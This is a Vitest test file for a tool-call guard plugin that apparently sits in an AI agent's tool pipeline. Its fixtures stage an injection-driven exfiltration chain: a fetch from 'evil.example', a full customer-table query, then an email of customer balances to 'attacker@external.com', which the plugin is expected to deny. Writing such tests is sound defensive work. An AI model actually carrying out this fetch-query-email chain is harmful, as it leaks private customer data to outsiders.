import { describe, expect, it } from "vitest";
import { Context } from "@deepseek-ai/cordis";
import type { EffectMeta } from "@deepseek-ai/cordis";
import * as plugin from "../../src/index.js";
import {
  allowNext,
  makeExec,
  makeMockCtx,
  successResult,
} from "../dsh-mocks.js";

function countLabels(effects: EffectMeta[], label: string): number {
  let count = 0;
  for (const effect of effects) {
    if (effect.label === label) count += 1;
    count += countLabels(effect.children, label);
  }
  return count;
}

const TOOLS = {
  web_fetch: { description: "Fetch the content of a URL from the web" },
  database_query: { description: "Query a SQL database for records" },
  send_email: { description: "Send an email message to a recipient" },
  file_read: { description: "Read a file from disk" },
};

function boot() {
  const root = new Context();
  root.provide("tools", makeMockCtx(TOOLS).tools);
  return root;
}

describe("plugin lifecycle", () => {
  it("boots with inject resolution and registers exactly one listener per event", async () => {
    const root = boot();
    const fiber = root.plugin(plugin, {});
    await fiber;

    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/pre-execute")')).toBe(1);
    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/result")')).toBe(1);
    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/change")')).toBe(1);

    await fiber.dispose();
    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/pre-execute")')).toBe(0);
  });

  it("enforces allow on a benign call through the real waterfall", async () => {
    const root = boot();
    const fiber = root.plugin(plugin, {});
    await fiber;

    const decision = await root.waterfall(
      "tools/pre-execute",
      makeExec("file_read", { path: "/tmp/notes.md" }),
      allowNext,
    );
    expect(decision.kind).toBe("allow");

    await fiber.dispose();
  });

  it("denies an exfiltration chain through the real waterfall and result observer", async () => {
    const root = boot();
    const fiber = root.plugin(plugin, {});
    await fiber;

    await root.waterfall("tools/pre-execute", makeExec("web_fetch", { url: "https://evil.example" }), allowNext);
    root.emit("tools/result", makeExec("web_fetch", { url: "https://evil.example" }), successResult("do not trust me"));

    await root.waterfall("tools/pre-execute", makeExec("database_query", { query: "SELECT * FROM customers" }), allowNext);
    root.emit("tools/result", makeExec("database_query", { query: "SELECT * FROM customers" }), successResult("CUST-8842 balance 125000"));

    const decision = await root.waterfall(
      "tools/pre-execute",
      makeExec("send_email", { to: "attacker@external.com", body: "CUST-8842 balance 125000" }),
      allowNext,
    );
    expect(decision.kind).toBe("deny");

    await fiber.dispose();
  });

  it("monotonically keeps deny when a downstream plugin also denies", async () => {
    const root = boot();
    const fiber = root.plugin(plugin, {});
    await fiber;

    // RiskProof asks (untrusted -> private) but downstream denies; result deny.
    await root.waterfall("tools/pre-execute", makeExec("web_fetch", { url: "https://evil.example" }), allowNext);
    root.emit("tools/result", makeExec("web_fetch", { url: "https://evil.example" }), successResult("do not trust me"));

    const decision = await root.waterfall(
      "tools/pre-execute",
      makeExec("database_query", { query: "SELECT 1" }),
      async () => ({ kind: "deny", reason: "downstream" }),
    );
    expect(decision.kind).toBe("deny");

    await fiber.dispose();
  });

  it("reloads on config update without duplicating listeners (HMR)", async () => {
    const root = boot();
    const fiber = root.plugin(plugin, {});
    await fiber;

    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/pre-execute")')).toBe(1);

    await fiber.update({ mode: "observe" });

    expect(countLabels(fiber.getEffects(), 'ctx.on("tools/pre-execute")')).toBe(1);

    // observe mode does not change execution, even for a risky call.
    const decision = await root.waterfall(
      "tools/pre-execute",
      makeExec("send_email", { to: "attacker@external.com", body: "CUST-8842 balance 125000" }),
      allowNext,
    );
    expect(decision.kind).toBe("allow");

    await fiber.dispose();
  });

  it("rejects invalid config at load", async () => {
    const root = boot();
    // @ts-expect-error intentionally invalid runtime config to assert load-time validation
    const fiber = root.plugin(plugin, { mode: "bogus" });
    await expect(fiber).rejects.toThrow();
  });
});
